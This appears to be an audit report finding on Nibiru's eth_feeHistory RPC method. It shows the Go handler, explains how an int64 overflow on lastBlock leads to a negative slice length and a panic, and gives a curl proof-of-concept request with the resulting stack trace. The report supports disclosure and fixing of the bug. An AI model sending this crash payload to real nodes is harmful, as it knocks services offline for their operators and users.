Implementation of eth_FeeHistory RPC method does not verify input parameters.

Lets look at the code from https://github.com/code-423n4/2024-11-nibiru/blob/main/eth/rpc/backend/chain_info.go#L86

```
func (b *Backend) FeeHistory(
        userBlockCount gethrpc.DecimalOrHex, // number blocks to fetch, maximum is 100
        lastBlock gethrpc.BlockNumber, // the block to start search, to oldest
        rewardPercentiles []float64, // percentiles to fetch reward
) (*rpc.FeeHistoryResult, error) {
        blockEnd := int64(lastBlock) //#nosec G701 -- checked for int overflow already

        if blockEnd < 0 {
                blockNumber, err := b.BlockNumber()
                if err != nil {
                        return nil, err
                }
                blockEnd = int64(blockNumber) //#nosec G701 -- checked for int overflow already
        }

        blocks := int64(userBlockCount)                     // #nosec G701 -- checked for int overflow already
        maxBlockCount := int64(b.cfg.JSONRPC.FeeHistoryCap) // #nosec G701 -- checked for int overflow already
        if blocks > maxBlockCount {
                return nil, fmt.Errorf("FeeHistory user block count %d higher than %d", blocks, maxBlockCount)
        }

1.        if blockEnd+1 < blocks {
                blocks = blockEnd + 1
        }
        blockStart := blockEnd + 1 - blocks
        oldestBlock := (*hexutil.Big)(big.NewInt(blockStart))

2.        reward := make([][]*hexutil.Big, blocks)
        rewardCount := len(rewardPercentiles)


```

1) Suppose that blockEnd is max positive value of int64, then 'blocks' will be negative

2) Go tries to allocate array with negative length and panics

How to reproduce:

1) build and run localnet

2) run command:

```
$ curl http://localhost:8545 \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "jsonrpc": "2.0", "method": "eth_feeHistory", "params": ["5","0x7fffffffffffffff", [20,30]] }'

```

3) observe panic in nibiru:
```
ERR RPC method eth_feeHistory crashed: runtime error: makeslice: len out of range
goroutine 1822916 [running]:
github.com/ethereum/go-ethereum/rpc.(*callback).call.func1()
	go/pkg/mod/github.com/!nibiru!chain/go-ethereum@v1.10.27-nibiru/rpc/service.go:200 +0x85
panic({0x3d746a0?, 0x4f66000?})
	golang/go/src/runtime/panic.go:770 +0x132
github.com/NibiruChain/nibiru/v2/eth/rpc/backend.(*Backend).FeeHistory(0xc0010ab188, 0x41d5686?, 0xc00065cfc0?, {0xc010a3f6a0, 0x2, 0x2})
	nibiru/eth/rpc/backend/chain_info.go:110 +0x178
github.com/NibiruChain/nibiru/v2/eth/rpc/rpcapi.(*EthAPI).FeeHistory(0xc0026d0930, 0x5, 0x7fffffffffffffff, {0xc010a3f6a0, 0x2, 0x2})
	nibiru/eth/rpc/rpcapi/eth_api.go:329 +0x77
reflect.Value.call({0xc0026895e0?, 0xc00103f610?, 0x80?}, {0x41c2e9d, 0x4}, {0xc001077b80, 0x4, 0xc001077b80?})
	go/src/reflect/value.go:596 +0xca6
reflect.Value.Call({0xc0026895e0?, 0xc00103f610?, 0x3?}, {0xc001077b80?, 0x16?, 0x16?})
	golang/go/src/reflect/value.go:380 +0xb9
github.com/ethereum/go-ethereum/rpc.(*callback).call(0xc001cd13e0, {0
```

